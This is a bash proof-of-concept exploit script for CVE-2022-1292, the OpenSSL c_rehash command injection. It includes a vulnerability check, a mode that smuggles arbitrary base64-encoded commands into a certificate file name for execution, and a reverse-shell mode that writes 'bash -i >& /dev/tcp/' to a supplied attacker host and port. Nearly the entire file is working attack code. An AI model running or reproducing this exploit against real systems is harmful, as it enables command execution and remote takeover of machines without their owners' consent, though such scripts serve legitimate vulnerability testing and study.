#!/bin/bash

echo -e """\n *************************************************************************
* Proof of Concept for CVE-CVE-2022-1292                                  *
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1292            *
*                                                                         *
*                           Exploit by: Juampa RodrÃ­guez (@UnD3sc0n0c1d0) *
 *************************************************************************\n""";

if [[ $1 == "check" ]]; then
 file=$(whereis c_rehash | cut -d ":" -f2 | cut -d " " -f2);
 if [[ $file == *c_rehash ]]; then
  echo -e "[-] Identified c_rehash script!";
  sleep 2;
  echo -e "[+] Analyzing...";
  sleep 2;
  filter=$(cat /usr/bin/c_rehash | egrep "\\$\fname =~ s|my \(\\$\hash" | wc -l);
  if [[ $filter > 3 ]]; then
   echo -e "\n[!] Host VULNERABLE to CVE-2022-1292!";
  else
   echo -e "[x] This host is not vulnerable (for now)!";
  fi
 else 
  echo -e "[x] The c_rehash script has not been identified on the host.";
 fi
elif [[ $1 == "command" ]]; then
 file=$(whereis c_rehash | cut -d ":" -f2 | cut -d " " -f2);
 cmd=$(echo -n $2 | base64);
 echo "-----BEGIN CERTIFICATE-----" > "tmpcert.crt\`echo $cmd | base64 -d | bash > tmp.txt\`";
 bash -c "$file . >/dev/null" 2>/dev/null;
 cat tmp.txt;
 rm -r tmp*; rm .0;
elif [[ $1 == "revshell" ]]; then
 file=$(whereis c_rehash | cut -d ":" -f2 | cut -d " " -f2);
 echo 'bash -i >& /dev/tcp/'$2'/'$3' 0>&1' > tmprshell.sh;
 echo "-----BEGIN CERTIFICATE-----" > "tmpcert.crt\`bash tmprshell.sh\`";
 bash -c "$file . >/dev/null" 2>/dev/null;
 rm -r tmp*; rm .0;
elif [[ $1 == "" ]]; then
 echo -e "Usage: bash CVE-2022-1292.sh [options] [arguments]\n";
 echo -e "options:";
 echo -e "      check           Check if the host is vulnerable to this security flaw.";
 echo -e "                      Validate the existence of the c_rehash script.";
 echo -e "      command         Performs operating system command injection.";
 echo -e "                          Example: bash CVE-2022-1292.sh command id";
 echo -e "      revshell        Establish a reverse connection to your attacker host.";
 echo -e "                      You need to maintain a listening port.";
 echo -e "                          Example: bash CVE-2022-1292.sh revshell rhost rport";
fi